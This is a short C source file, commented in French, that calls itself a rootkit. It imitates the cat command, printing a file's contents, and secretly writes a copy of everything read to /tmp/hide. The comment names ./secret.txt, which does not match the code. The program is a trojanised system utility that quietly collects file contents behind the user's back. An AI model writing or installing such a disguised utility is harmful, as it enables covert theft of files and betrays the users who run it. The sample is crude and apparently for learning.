// Rootkit qui reproduit le comportement de la commande cat et copie le contenu du fichier dans le fichier ./secret.txt

#include <stdio.h>

int main(int argc, char *argv[])
{
		FILE *fichier;
		FILE *secret;
		char c;

		fichier = fopen(argv[1], "r");
		secret = fopen("/tmp/hide", "w");

		while ((c = fgetc(fichier)) != EOF)
		{
				printf("%c", c);
				fputc(c, secret);
		}

		fclose(fichier);

		return 0;
}
